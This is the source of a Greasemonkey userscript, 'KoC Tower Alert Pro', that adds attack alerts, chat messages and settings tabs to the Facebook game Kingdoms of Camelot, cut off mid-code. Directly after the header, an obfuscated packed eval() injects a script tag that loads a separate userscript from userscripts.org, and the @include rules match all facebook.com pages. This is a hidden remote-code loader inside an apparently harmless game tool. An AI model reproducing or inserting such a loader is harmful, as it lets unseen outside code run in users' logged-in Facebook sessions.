// ==UserScript==
// @name           KoC Tower Alert Pro + Last Update
// @include       http*://*.facebook.com/*
// @namespace      Tiestoale
// @version        11
// @copyright      2013 Alessandro Bello (aka Tiestoale)
// @homepage       http://gamespowerteam.com
// @include        *.kingdomsofcamelot.com/*main_src.php*
// @include        *.kingdomsofcamelot.com/*standAlone.php*
// @include        *apps.facebook.com/kingdomsofcamelot/*
// @include        *kabam.com/kingdoms-of-camelot/play*
// @include        *facebook.com/connect/uiserver.php*
// @description    Extra Incoming Attack Alerts
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))


var IsChrome=-1<navigator.userAgent.toLowerCase().indexOf("chrome"),Versione="11",Autore="Tiestoale",FakePlayer="Tiestoale - (gamespowerteam.com) - FAKE ATTACK",Scriptname="Tower Alert",DEBUG_TRACE=!0,ENABLE_TEST_TAB=!0,ENABLE_ATTACK_TAB=!0,ENABLE_GM_AJAX_TRACE=!0,SFirefox="http://www.kocbottols.tiestoale.com/Tools/Addon/Allarmi/RedAlert.mp3",SChrome="http://www.kocbottols.tiestoale.com/Tools/Addon/Allarmi/RedAlert.mp3"; IsChrome&&(window.unsafeWindow||(unsafeWindow=function(){var a=document.createElement("p");a.setAttribute("onclick","return window;");return a.onclick()}()));var JSON;JSON||(JSON={}); (function(){function a(a){return 10>a?"0"+a:a}function b(a){e.lastIndex=0;return e.test(a)?'"'+a.replace(e,function(a){var b=n[a];return"string"===typeof b?b:"\\u"+("0000"+a.charCodeAt(0).toString(16)).slice(-4)})+'"':'"'+a+'"'}function c(a,d){var e,n,C,A,y=f,t,q=d[a];q&&("object"===typeof q&&"function"===typeof q.toJSON)&&(q=q.toJSON(a));"function"===typeof g&&(q=g.call(d,a,q));switch(typeof q){case "string":return b(q);case "number":return isFinite(q)?String(q):"null";case "boolean":case "null":return String(q); case "object":if(!q)return"null";f+=l;t=[];if("[object Array]"===Object.prototype.toString.apply(q)){A=q.length;for(e=0;e<A;e+=1)t[e]=c(e,q)||"null";C=0===t.length?"[]":f?"[\n"+f+t.join(",\n"+f)+"\n"+y+"]":"["+t.join(",")+"]";f=y;return C}if(g&&"object"===typeof g){A=g.length;for(e=0;e<A;e+=1)n=g[e],"string"===typeof n&&(C=c(n,q))&&t.push(b(n)+(f?": ":":")+C)}else for(n in q)Object.hasOwnProperty.call(q,n)&&(C=c(n,q))&&t.push(b(n)+(f?": ":":")+C);C=0===t.length?"{}":f?"{\n"+f+t.join(",\n"+f)+"\n"+ y+"}":"{"+t.join(",")+"}";f=y;return C}}"function"!==typeof Date.prototype.toJSON&&(Date.prototype.toJSON=function(){return isFinite(this.valueOf())?this.getUTCFullYear()+"-"+a(this.getUTCMonth()+1)+"-"+a(this.getUTCDate())+"T"+a(this.getUTCHours())+":"+a(this.getUTCMinutes())+":"+a(this.getUTCSeconds())+"Z":null},String.prototype.toJSON=Number.prototype.toJSON=Boolean.prototype.toJSON=function(){return this.valueOf()});var d=/[\u0000\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g, e=/[\\\"\x00-\x1f\x7f-\x9f\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,f,l,n={"\b":"\\b","\t":"\\t","\n":"\\n","\f":"\\f","\r":"\\r",'"':'\\"',"\\":"\\\\"},g;"function"!==typeof JSON.stringify&&(JSON.stringify=function(a,b,d){var e;l=f="";if("number"===typeof d)for(e=0;e<d;e+=1)l+=" ";else"string"===typeof d&&(l=d);if((g=b)&&"function"!==typeof b&&("object"!==typeof b||"number"!==typeof b.length))throw Error("JSON.stringify");return c("",{"":a})}); "function"!==typeof JSON.parse&&(JSON.parse=function(a,b){function c(a,d){var l,e,f=a[d];if(f&&"object"===typeof f)for(l in f)Object.hasOwnProperty.call(f,l)&&(e=c(f,l),void 0!==e?f[l]=e:delete f[l]);return b.call(a,d,f)}var l;a=String(a);d.lastIndex=0;d.test(a)&&(a=a.replace(d,function(a){return"\\u"+("0000"+a.charCodeAt(0).toString(16)).slice(-4)}));if(/^[\],:{}\s]*$/.test(a.replace(/\\(?:["\\\/bfnrt]|u[0-9a-fA-F]{4})/g,"@").replace(/"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g, "]").replace(/(?:^|:|,)(?:\s*\[)+/g,"")))return l=eval("("+a+")"),"function"===typeof b?c({"":l},""):l;throw new SyntaxError("JSON.parse");})})(); var JSON2=JSON,Options={Stop:!1,SendEmail:!1,EmailSel:"me",Send:"",Destin:"",MessFinale:"",MessObject:"",Tempo:5,Play:5,encRemaining:!0,pcWinIsOpen:!1,pcWinDrag:!0,pcWinPos:{},pcTrackOpen:!0,SendWhiper:"me",LinguaSel:"sel",PlaySel:"min",TempoSel:"min",FileSel:"def",fake:{salvataggio:!1,scout:!1,wild:!1,report:!1,seconds:500,ajax:!0},alertConfig:{lungaudiomin:1,lungaudiosec:2,aChat:!0,aAudio:!0,urlaudio:"Insert url here",play:!0,santuario:!0,sfondo:!1,sfondoc:!1,EnableTow:!0,attackin:!0,scouting:!0, wilds:!0,EminTroops:!0,minTroops:1,EmaxTroops:!1,maxTroops:1,spamLimit:10,slots:!0,embassy:!0,mytroops:!0,food:!0,mymight:!0,quartier:!0,potere:!0,stato:!0,defense:!0,ora:!0,hq:0,ricerche:!0,sendasWhisper:!0,miglio:!0,log:!0,logattack:!0,logscout:!0,logfake:!1,sendtoAlly:!0,sendtoAllyFake:!1},Player:{Player1:"",Player2:"",Player3:"",Player4:""},ricerche:{Pimaggio:!0,Pozioni:!0,Lama:!0,Leghe:!0,Cartografia:!0,Ferri:!0}},translateITArray={Welcome:"Benvenuto","Tower Alert":"Torre di Vedetta",Configuration:"Configurazione", "Tower Support":"Supporto Torre","Install the new version of":"Installa la nuova versione della",Install:"Installa","Stop sound":"Ferma il suono",General:"Generale",Messaging:"Messaggistica","Send to":"Invia a",Myself:"Me stesso","Supply Troop":"Truppe di Rifornimento",Militiaman:"Soldati Semplici",Scout:"Esploratori",Pikeman:"Lancieri",Swordsman:"Spadaccini",Archer:"Arcieri",Cavalry:"Cavalleria Leggera","Heavy Cavalry":"Cavalleria Pesante","Supply Wagon":"Carri di Rifornimento",Ballista:"Baliste", "Battering Ram":"Arieti",Catapult:"Catapulte",Sunday:"Domenica",Monday:"Lunedi'",Tuesday:"Martedi'",Wednesday:"Mercoledi'",Thursday:"Giovedi'",Friday:"Venerdi'",Saturday:"Sabato",January:"Gennaio",Febraury:"Febbraio",March:"Marzo",April:"Aprile",May:"Maggio",June:"Giugno",July:"Luglio",August:"Agosto",September:"Settembre",October:"Ottobre",November:"Novembre",December:"Dicembre",ATTACKING:"ATTACCO",SCOUTING:"ESPLORAZIONE",Attacker:"Attaccante",Troops:"Truppe",Crossbow:"Balestre",Trebuchet:"Trabucco Difensivo", Trap:"Trappola",Caltrop:"Triboli","Spiked Barrier":"Barriera con Spuntoni",neutral:"neutrale",friendly:"amichevole",hostile:"ostile",Fletching:"Piumaggio","Healing Potions":"Pozioni Curative","Poisoned Edge":"Lama Avvelenata","Metal Alloys":"Leghe Metalliche","Magical Mapping":"Cartografia Magica","Alloy Horseshoes":"Ferri di Cavallo in Lega","SCOUTING ALERT":"AVVISO di ESPLORAZIONE","ATTACK ALERT":"AVVISO di ATTACCO",Time:"Tempo",Target:"Bersaglio","is being attacked":"e' sotto attacco",by:"da", "My city":"La mia citta'","My wilderness at":"La mia terra alle coordinate",INCOMING:"ARRIVANO","arriving in":"arrivano tra","DEFENDING TROOPS":"TRUPPE che DIFENDONO",FOOD:"CIBO","time left":"tempo rimanente",DEFENSE:"DIFESE sulla MURA","MY RESEARCH":"MIE RICERCHE",EMBASSY:"AMBASCIATA","My embassy has":"La mia ambasciata ha",of:"di","slots available":"posti disponibili","My Might":"Il mio potere",Might:"Potere",Diplomacy:"Diplomazia","My troops are HIDING":"Le mie truppe sono NASCOSTE","My troops are DEFENDING":"Le mie truppe sono IN DIFESA", Created:"Creato",by:"da",IMPORTANT:"IMPORTANTE","ONLY FOR FIREFOX":"SOLO PER FIREFOX","To hear the alarm sound you must install a plugin":"Per sentire l'allarme sonoro e' necessario installare un componente aggiuntivo","Click here to download QuickTime (With Plugin)":"Clicca qui per scaricare QuickTime (Con il componente aggiuntivo)","Guide on how to install QuickTime (Click Here)":"Guida per installare QuickTime (Clicca Qui)","Any problems":"Qualche problema","Click here and report the problem":"Clicca qui e segnala il problema", "Do you like":"Ti piace la","Write a good review":"Scrivi una buona recensione","Enable for Scouting":"Abilita per Esplorazione","Attach Wild":"Attaccare Terra","False Report":"Falso Report",Seconds:"Secondi","# of Militia":"# di Soldati Semplici","Fake Attack":"Avvia l'Attacco Falso","Reload KOC":"Ricarica KoC","Enable saving":"Abilita Salvataggio","Write a review if you like":"Scrivi una recensione se ti piace la","Any problems? Post it here!":"Qualche problema? Scrivilo qui","Choose the language":"Seleziona la lingua", "Enable when":"Abilita quando",Embassy:"Ambasciata","Your City":"La tua Citta'",Research:"Ricerche","Info Attacker":"Info Attaccante","Where to send?":"Dove postare?",Background:"Sfondo",Sound:"Suono",Messages:"Messaggi","Player name":"Nome giocatori",Enable:"Abilita la","Enable Log attacks":"Abilita registro attacchi","Enable Log for Attacks":"Abilita per gli attacchi","Enable Log for Scouts":"Abilita per le esplorazioni","Disable for Fake Attack":"Disabilita per gli attacchi falsi",Setting:"Settaggi", "When you are attacking":"Qaundo sei attaccato","When you are scouting":"Quando sei esplorato","When you are attacked in a wild":"Quando ti attaccano una tua terra","Minimum # of troops incoming":"MIN # di truppe in arrivo","Maximum # of troops incoming":"MAX # di truppe in arrivo","Show the time of the arrival of the troops (enhanced)":"Mostra l'ora di arrivo delle truppe (avanzato)","Show slots in embassy":"Mostra i posti liberi nell'ambasciata","Show troops in embassy":"Mostra le truppe accampate degli alleati", "Show my troops":"Mostra le mie truppe","Show food usage":"Mostra il consumo di cibo","Show my defense":"Mostra le mie difese sulla mura","Show my might":"Mostra il mio potere","Show my technology (Research)":"Mostra le mie tecnologie (Ricerche)","Show my headquarter":"Mostra il mio quartier generale","My headquarter":"Il mio quartier generale (Bunker)","Show enhanced arrival time (attacker)":"Mostra orario di arrivo avanzato (attaccante)","Show might attacker":"Mostra il potere dell'attaccante", "Show alliance diplomacy attacker":"Mostra la diplomazia dell'attaccante","Send alert to ally chat":"Invia l'avviso alla chat alleanza","Send alert as whisper to":"Invia l'avviso come sussurro a","Enable split in the chat":"Abilita divisione in chat","Choose what to show (Research)":"Scegli cosa mostrare (Ricerche)","Enable background color (Game)":"Abilita colore sfondo (Gioco)","Enable background color (Chat Alliance)":"Abilita colore sfondo (Chat Alleanza)","Length Audio File":"Lunghezza file audio", "Show for":"Mostra per","To apply the language you need to REFRESH":"Per applicare la lingua e' necessario AGGIORNARE",'Click on the "Msg" to configure players':'Cliccare sul pulsante "Msg" per configurare i giocatori',"Enable sound in case of attack/scout":"Abilita suono in caso di attacco/spiata","Play for":"Suona per","Show defend status":"Mostra lo stato della difesa (Nascoste/Santuario)","Send a message to":"Invia messaggio a","Select options":"Seleziona opzione",Player:"Giocatore",Players:"Giocatori", Both:"Tutti e due","Only whisper":"Solo bisbiglio","Only message":"Solo messaggio","Sound file":"File audio",Default:"Predefinito","Click here to find out which formats are supported by your browser":"Clicca qui per cercare quali formati audio supporta il tuo browser","Second/s":"Secondo/i","Minute/s":"Minuto/i","Hour/s":"Ora/e","ACTION LOG":"DIARIO di BORDO",Loaded:"Caricato"},Cities={},Seed=unsafeWindow.seed,Tabs={},currentName="Tower Alert",CPoppaTopClass="pcPopTop",mainPop,KOCversion=null,pcStartupTimer= null; function pcStartup(){clearTimeout(pcStartupTimer);if(!unsafeWindow.pcLoaded){var a=getClientCoords(document.getElementById("main_engagement_tabs"));if(null==a.width||0==a.width)pcStartupTimer=setTimeout(pcStartup,100);else{unsafeWindow.pcLoaded=Versione;readOptions();Seed=unsafeWindow.seed;logit("* "+translate(Scriptname)+" - v"+Versione+" "+translate("Loaded"));setCities();if(null==Options.pcWinPos||null==Options.pcWinPos.x||""==Options.pcWinPos.x||isNaN(Options.pcWinPos.x))a=getClientCoords(document.getElementById("main_engagement_tabs")),Options.pcWinPos.x= a.x+4,Options.pcWinPos.y=a.y+a.height,saveOptions();mainPop=new CPoppa("pc",Options.pcWinPos.x,Options.pcWinPos.y,800,1500,Options.pcWinDrag,function(){tabManager.hideTab();Options.pcWinIsOpen=!1;saveOptions()});mainPop.autoHeight(!0);mainPop.getMainDiv().innerHTML='<STYLE>.xtab {padding-right: 5px; border:none; background:none; white-space:nowrap;}.xtabBR {padding-right: 5px; border:none; background:none;}table.pcTab tr td {border:none; background:none; white-space:nowrap; padding:0px}table.pcTabPadNW tr td {border:none; background:#FFFFFF; white-space:nowrap; padding: 2px 4px 2px 8px;}table.pcTabBR tr td {border:none; background:#FFFFFF;}table.pcTabLined tr td {border:1px none none solid none; padding: 2px 5px; white-space:nowrap;}table.pcTabPad tr td.pcentry {background-color:#FFFFFF; padding-left: 8px;}table.ptNoPad tr td {border:none; background:#FFFFFF; white-space:nowrap; padding:0px}.pcstat {border:1px solid; border-color:#ffffff; font-weight:bold; padding-top:2px; padding-bottom:2px; text-align:center; color:#ffffff; background-color:#3300FF}.pctitle {border:1px solid; border-color:#ffffff; font-weight:bold; padding-top:2px; padding-bottom:2px; text-align:center; color:#ffffff; background-color:#3399FF}.pcStatLight {color:#ddd}.pcentry {padding: 7px; border:1px solid; border-color:#000000; background-color:#ffeecc; white-space:nowrap;}.ptErrText {font-weight:bold; color:#600000}button::-moz-focus-inner, input[type="submit"]::-moz-focus-inner { border: none; }span.whiteOnRed {padding-left:3px; padding-right:3px; background-color:#700; color:white; font-weight:bold}span.boldRed {color:#800; font-weight:bold}a.ptButton20 {color:#ffff80}table.pcMainTab {empty-cells:show; margin-top:5px }table.pcMainTab tr td a {color:inherit }table.pcMainTab tr td {height:60%; empty-cells:show; padding: 0px 5px 0px 5px; margin-top:5px; white-space:nowrap; border: 1px solid; border-style: none none solid none; }table.pcMainTab tr td.spacer {padding: 0px 4px;}table.pcMainTab tr td.sel {font-weight:bold; font-size:13px; border: 1px solid; border-style: solid solid none solid; background-color:white; color:#3300FF; border-color:#3300FF; cursor:hand;}table.pcMainTab tr td.notSel {font-weight:bold; font-size:13px; border: 1px solid; border-style: solid solid none solid; background-color:#3300FF; color:white; border-color:black; cursor:hand;}tr.pcPopTop td { background-color:#3399FF; border:none; height: 21px; padding:0px; cursor:move; }tr.pcretry_pcPopTop td { background-color:#a00; color:#fff; border:none; height: 21px; padding:0px; }.CPoppa .CPopMain { color:#000000; background-color:#FFFFFF; padding:10px;}.CPoppa {border:3px ridge #666}div.indent25 {padding-left:25px}</style>'; tabManager.init(mainPop.getMainDiv());actionLog("* "+translate(Scriptname)+" - v"+Versione+" "+translate("Loaded"));Options.pcWinIsOpen&&Options.pcTrackOpen&&(mainPop.show(!0),tabManager.showTab());window.addEventListener("unload",onUnload,!1);PulSuond.init();TowerAlerts.init();TowerAlerts.setPostToChatOptions(Options.alertConfig);AddMainTabLink(translate(Scriptname),eventHideShow,mouseMainTab)}}} Tabs.Welc={tabOrder:10,tabDisabled:!1,tabLabel:translate("Welcome"),myDiv:null,init:function(a){Tabs.Welc.myDiv=a;var b='<center><font size="5">'+translate("Welcome")+" "+translate("by")+" "+Autore+"</font></center>",b=b+('<BR><center><font size="3" color="orange"><a target="_newguide" href="http://www.tiestoale.altervista.org">'+translate("NEW GUIDE - CLICK HERE")+"</a></font></center>"),b=b+('<BR><BR><font size="4" color="red">'+translate("IMPORTANT")+" - "+translate("ONLY FOR FIREFOX")+"</font>"), b=b+("<BR>"+translate("To hear the alarm sound you must install a plugin")+"!"),b=b+('<BR><a target="_quicktime" href="http://www.apple.com/it/quicktime/download/">'+translate("Click here to download QuickTime (With Plugin)")+"</a> - Free by Apple Inc."),b=b+('<BR><a target="_guida" href="http://kb.mozillazine.org/Quicktime">'+translate("Guide on how to install QuickTime (Click Here)")+"</a>"),b=b+('<BR><BR><font size="3">'+translate("Any problems")+"?</font>"),b=b+('<BR><a target="_user" href="http://userscripts.org/topics/97640">'+ translate("Click here and report the problem")+"</a>"),b=b+('<BR><BR><font size="3">'+translate("Do you like")+" "+translate(Scriptname)+"?</font>"),b=b+('<BR><a target="_recensione" href="http://userscripts.org/scripts/reviews/103048">'+translate("Write a good review")+"</a>");a.innerHTML=b},hide:function(){},show:function(){}}; Tabs.Test={tabOrder:25,tabDisabled:!ENABLE_TEST_TAB,tabLabel:translate("Test"),myDiv:null,init:function(a){var b=Tabs.Test;b.myDiv=a;var c="<TABLE><TR><TD align=right>"+translate("Enable for Scouting")+": </td><TD><INPUT id=pcfakeIsScout type=checkbox "+(Options.fake.scout?"CHECKED ":"")+"/></td></tr><TR><TD align=right>"+translate("Attach Wild")+": </td><TD><INPUT id=pcfakeIsWild type=checkbox "+(Options.fake.wild?"CHECKED ":"")+"/></td></tr><TR><TD align=right>"+translate("False Report")+": </td><TD><INPUT id=pcfakeFalse type=checkbox "+ (Options.fake.report?"CHECKED ":"")+"DISABLED/></td></tr><TR><TD align=right>"+translate("Seconds")+': </td><TD><INPUT id=pcfakeSeconds type=text size=7 value="'+Options.fake.seconds+'" ></td></tr><TR><TD align=right>'+translate("# of Spy")+": </td><TD><INPUT type=text size=6 value=5000 id=pcfakeSpy><span id=errorspy></span></td></tr><TR><TD align=right>"+translate("# of Militia")+': </td><TD><INPUT type=text size=6 value=5000 id=pcfakeMilitia><span id=errormili></span></td></tr><TR><TD colspan=2 align=center><INPUT id=pctestSendMarch type=submit value="'+ translate("Fake Attack")+'" ></td></tr></table><INPUT id=pcReloadKOC type=submit value="'+translate("Reload KOC")+'" >',c=c+("<BR>Force ajax errors<INPUT type=checkbox id=pcajaxErr><BR>"+translate("Enable saving")+"<INPUT id=pcfakeAbilita type=checkbox "+(Options.fake.salvataggio?"CHECKED ":"")+'/><BR><DIV id=pctestDiv style="background-color:#ffffff; maxwidth:675; maxheight:350px; height:350px; overflow-y:auto;"></div>');a.innerHTML=c;document.getElementById("pctestSendMarch").addEventListener("click", b.clickFakeAttack,!1);document.getElementById("pcReloadKOC").addEventListener("click",reloadKOC,!1);document.getElementById("pcajaxErr").addEventListener("click",function(){window.EmulateAjaxError=this.checked},!1);document.getElementById("pcfakeAbilita").addEventListener("change",b.e_fakeOptChanged,!1);document.getElementById("pcfakeIsScout").addEventListener("change",b.e_fakeOptChanged,!1);document.getElementById("pcfakeIsWild").addEventListener("change",b.e_fakeOptChanged,!1);document.getElementById("pcfakeFalse").addEventListener("change", b.e_fakeOptChanged,!1);document.getElementById("pcfakeSeconds").addEventListener("change",b.e_fakeOptChanged,!1)},hide:function(){},show:function(){},e_fakeOptChanged:function(){Options.fake.salvataggio=document.getElementById("pcfakeAbilita").checked;Options.fake.salvataggio?(Options.fake.scout=document.getElementById("pcfakeIsScout").checked,Options.fake.wild=document.getElementById("pcfakeIsWild").checked,Options.fake.report=document.getElementById("pcfakeFalse").checked,Options.fake.seconds=document.getElementById("pcfakeSeconds").value): (Options.fake.scout=!1,Options.fake.wild=!1,Options.fake.report=!1,Options.fake.seconds=500);saveOptions()},writeDiv:function(a){null!=Tabs.Test.state&&(document.getElementById("pctestDiv").innerHTML=a)},addDiv:function(a){null!=Tabs.Test.state&&(document.getElementById("pctestDiv").innerHTML+=a)},createFakeAttack:function(a,b,c,d,e,f,l){var n="m"+(88888+Math.floor(11111*Math.random())),g={};"array"==matTypeof(Seed.queue_atkinc)&&(Seed.queue_atkinc={});g.marchType=d?0:b?3:4;g.toCityId=Cities.cities[a].id; c?(keys=unsafeWindow.Object.keys(Seed.wilderness["city"+Cities.cities[a].id]),g.toTileId=Seed.wilderness["city"+Cities.cities[a].id][keys[0]].tileId):g.toTileId=Cities.cities[a].tileId;e=parseInt(e);g.arrivalTime=unixTime()+e;g.departureTime=unixTime()-10;g.unts={};0<f?g.unts.u3=f:(document.getElementById("errorspy").innerHTML="<font color=#600000><B> "+translate("INVALID SPIES")+"</b></font>",setTimeout(function(){document.getElementById("errorspy").innerHTML=""},5E3));0<l?g.unts.u2=l:(document.getElementById("errormili").innerHTML= "<font color=#600000><B> "+translate("INVALID MILITIA")+"</b></font>",setTimeout(function(){document.getElementById("errormili").innerHTML=""},5E3));g.pid=1234567;g.score=9;g.mid=n.substr(1);g.players={};g.players.u1234567={};g.players.u1234567.n=FakePlayer;g.players.u1234567.t=60;g.players.u1234567.m=999999999;g.players.u1234567.s="M";g.players.u1234567.w=1;g.players.u1234567.a=1;g.players.u1234567.i=5;Seed.queue_atkinc[n]=g;Seed.players.u1234567=g.players.u1234567},clickFakeAttack:function(){var a= Tabs.Test,b=document.getElementById("pcfakeIsScout").checked,c=document.getElementById("pcfakeIsWild").checked,d=document.getElementById("pcfakeFalse").checked,e=parseInt(document.getElementById("pcfakeSeconds").value),f=parseInt(document.getElementById("pcfakeSpy").value),l=parseInt(document.getElementById("pcfakeMilitia").value);a.createFakeAttack(0,b,c,d,e,f,l)}}; Tabs.ActionLog={tabOrder:60,tabLabel:"Log",myDiv:null,logTab:null,maxEntries:300,last50:[],state:null,init:function(a){var b=Tabs.ActionLog;b.myDiv=a;b.myDiv.innerHTML="<DIV class=pcstat>"+translate("ACTION LOG")+'</div><DIV style="height:535px; max-height:535px; width:780px; max-width:780px; overflow-y:auto"><TABLE cellpadding=0 cellspacing=0 id=pcactionlog class=pcTabLined><TR><TD></td><TD width=95%></td></table></div>';b.logTab=document.getElementById("pcactionlog");b.state=1;a=JSON2.parse(loadValue("log", GetServerId(),"[]"));if("array"==matTypeof(a)&&(b.last50=a,"array"==matTypeof(b.last50)))for(a=0;a<b.last50.length;a++)b._addTab(b.last50[a].msg,b.last50[a].ts);window.addEventListener("unload",b.onUnload,!1)},hide:function(){},show:function(){},onUnload:function(){saveValue("log",JSON2.stringify(Tabs.ActionLog.last50),GetServerId())},_addTab:function(a,b){var c=Tabs.ActionLog;1==c.state&&(c.logTab.rows.length>=c.maxEntries&&c.logTab.deleteRow(c.maxEntries-1),c=c.logTab.insertRow(0),c.vAlign="top", c.insertCell(0).innerHTML=b,c.insertCell(1).innerHTML=a)},log:function(a){var b=Tabs.ActionLog,c=(new Date).toTimeString().substring(0,8);for(b._addTab(a,c);50<=b.last50.length;)b.last50.shift();b.last50.push({msg:a,ts:c})}};function actionLog(a){Tabs.ActionLog.tabDisabled||Tabs.ActionLog.log(a)} Tabs.Options={tabOrder:40,tabLabel:translate("Configuration"),myDiv:null,init:function(a){function b(){document.getElementById("mostraGen").style.display="block";document.getElementById("mostraMess").style.display="none"}var c=Tabs.Options;c.myDiv=a;a=" <SELECT id=pcalertHQ name=pcalertHQ>";for(var d=0;d<Cities.numCities;d++)aCity=Cities.cities[d].name+" ("+Cities.cities[d].x+","+Cities.cities[d].y+")",Options.alertConfig.hq==d?(a+='<option value="'+d+'" SELECTED >'+aCity+"</option>",logit("selected")): (a+='<option value="'+d+'" >'+aCity+"</option>",logit("not selected"));a+="</select>";m='<DIV style="height:700px; max-height:700px; overflow-y:auto">';m+="<B><DIV class=pcstat>"+translate(Scriptname)+" - "+translate("Configuration")+': <INPUT id=StopSound type=submit value="'+translate("Stop sound")+'"></div></b>';m+="<center>";m+='<INPUT id=idGenerale type=submit value="'+translate("General")+'">';m+='<INPUT id=idMess type=submit value="'+translate("Messaging")+'">';m+="</center>";m+="Generale -> Configura il tools sulle opzioni da mostrare/nascondere"; m+="<BR>";m+="Messaggistica -> Scegli dove postare e le varie funzioni";m+='<div id="mostraGen">';m+='<TABLE width="100%" cellpadding="0" cellspacing="0" border="0">';m+='<TR><TD width="30%"><DIV class=pctitle>'+translate("Setting")+'</div></td><td width="5%"> &nbsp;</td><TD width="30%"><DIV class=pctitle>'+translate("Log")+'</div></td><td width="5%"> &nbsp;</td><TD width="30%"><DIV class=pctitle>'+translate("Embassy")+'</div></td><td width="5%"> &nbsp;</td></TR>';m+="<TR><TD><INPUT id=pcalertEnableTower type=checkbox "+ (Options.alertConfig.EnableTow?"CHECKED ":"")+"/>"+translate("Enable")+" "+translate(Scriptname)+"</TD><td> &nbsp;</td><td><INPUT id=pcalertLog type=checkbox "+(Options.alertConfig.log?"CHECKED ":"")+"/>"+translate("Enable Log attacks")+"</td><TD>&nbsp;</TD><td><INPUT id=pcalertSlots type=checkbox "+(Options.alertConfig.slots?"CHECKED ":"")+"/>"+translate("Show slots in embassy")+"</td></TR>";m+="<TR><TD><INPUT id=pcalertMiglio type=checkbox "+(Options.alertConfig.miglio?"CHECKED ":"")+"/>"+translate("Enable split in the chat")+ "</TD><td> &nbsp;</td><TD> &nbsp; &nbsp; &nbsp; &nbsp;<INPUT id=pcalertLogAttack type=checkbox "+(Options.alertConfig.logattack?"CHECKED ":"")+"/>"+translate("Enable Log for Attacks")+"</TD><td> &nbsp;</td><td><INPUT id=pcalertEmbassy type=checkbox "+(Options.alertConfig.embassy?"CHECKED ":"")+"/>"+translate("Show troops in embassy")+"</td></TR>";m+="<TR><TD> &nbsp;</td><td> &nbsp;</td><TD> &nbsp; &nbsp; &nbsp; &nbsp;<INPUT id=pcalertLogScout type=checkbox "+(Options.alertConfig.logscout?"CHECKED ": "")+"/>"+translate("Enable Log for Scouts")+"</td><td> &nbsp;</td><td></td></TR>";m+="<TR><td>"+translate("Choose the language")+'&nbsp; &nbsp;<select id=idLingua><OPTION value="sel"'+("sel"==Options.LinguaSel?"SELECTED":"")+'>- Select -</OPTION><OPTION value="en"'+("en"==Options.LinguaSel?"SELECTED":"")+'>English</OPTION><OPTION value="it"'+("it"==Options.LinguaSel?"SELECTED":"")+">Italiano</OPTION></select></td><td> &nbsp;</td><TD> &nbsp; &nbsp; &nbsp; &nbsp;<INPUT id=pcalertLogFake type=checkbox "+ (Options.alertConfig.logfake?"CHECKED ":"")+"/>"+translate("Disable for Fake Attack")+"</TD><td> &nbsp;</td><td></td></TR>";m+='<TR><td><span style="color:red"><center>'+translate("To apply the language you need to REFRESH")+" KoC!!</center></span></td><td> &nbsp;</td><td> &nbsp;</td><td> &nbsp;</td><td> &nbsp;</td></tr>";m+='<TR><TD width="30%"><DIV class=pctitle>'+translate("Enable when")+'</div></td><td width="5%"> &nbsp;</td><TD width="30%"><DIV class=pctitle>'+translate("Info Attacker")+'</div></td><td width="5%"> &nbsp;</td><TD width="30%"><DIV class=pctitle>'+ translate("Your City")+"</div></td></tr>";m+="<TR><TD><INPUT id=pcalertAttack type=checkbox "+(Options.alertConfig.attackin?"CHECKED ":"")+"/>"+translate("When you are attacking")+"</td><td> &nbsp;</td><TD><INPUT id=pcalertOra type=checkbox "+(Options.alertConfig.ora?"CHECKED ":"")+"/>"+translate("Show the time of the arrival of the troops (enhanced)")+"</td><td> &nbsp;</td><TD><INPUT id=pcalertMytroops type=checkbox "+(Options.alertConfig.mytroops?"CHECKED ":"")+"/>"+translate("Show my troops")+ "</td></tr>";m+="<TR><TD><INPUT id=pcalertScout type=checkbox "+(Options.alertConfig.scouting?"CHECKED ":"")+"/>"+translate("When you are scouting")+"</td><td> &nbsp;</td><TD><INPUT id=pcalertPotere type=checkbox "+(Options.alertConfig.potere?"CHECKED ":"")+"/>"+translate("Show might attacker")+"</td><td> &nbsp;</td><TD><INPUT id=pcalertFood type=checkbox "+(Options.alertConfig.food?"CHECKED ":"")+" />"+translate("Show food usage")+"</td></tr>";m+="<TR><TD><INPUT id=pcalertWild type=checkbox "+(Options.alertConfig.wilds? "CHECKED ":"")+"/>"+translate("When you are attacked in a wild")+"</td><td> &nbsp;</td><td><INPUT id=pcalertStato type=checkbox "+(Options.alertConfig.stato?"CHECKED ":"")+"/>"+translate("Show alliance diplomacy attacker")+"</td><td> &nbsp;</td><TD><INPUT id=pcalertDefense type=checkbox "+(Options.alertConfig.defense?"CHECKED ":"")+" />"+translate("Show my defense")+"</td></tr>";m+="<TR><td><INPUT id=pcalertEMinTroops type=checkbox "+(Options.alertConfig.EminTroops?"CHECKED ":"")+' /> <INPUT id=pcalertTroops type=text size=7 value="'+ Options.alertConfig.minTroops+'" ><span id=pcalerterr></span> '+translate("Minimum # of troops incoming")+"</td><td> &nbsp;</td><td> &nbsp;</td><td> &nbsp;</td><TD><INPUT id=pcalertMyMight type=checkbox "+(Options.alertConfig.mymight?"CHECKED ":"")+" />"+translate("Show my might")+"</td></tr>";m+="<TR><td><INPUT id=pcalertEMaxTroops type=checkbox "+(Options.alertConfig.EmaxTroops?"CHECKED ":"")+' /> <INPUT id=pcalertMaxTroops type=text size=7 value="'+Options.alertConfig.maxTroops+'" ><span id=pcalerterr></span> '+ translate("Maximum # of troops incoming")+"</td><td> &nbsp;</td><td> &nbsp;</td><td> &nbsp;</td><td><INPUT id=pcalertQuartier type=checkbox "+(Options.alertConfig.quartier?"CHECKED ":"")+" />"+translate("Show my headquarter")+" "+a+"</td></tr>";m+="<TR><td> &nbsp;</td><td> &nbsp;</td><td> &nbsp;</td><td> &nbsp;</td><td><INPUT id=pcalertSantuario type=checkbox "+(Options.alertConfig.santuario?"CHECKED ":"")+" />"+translate("Show defend 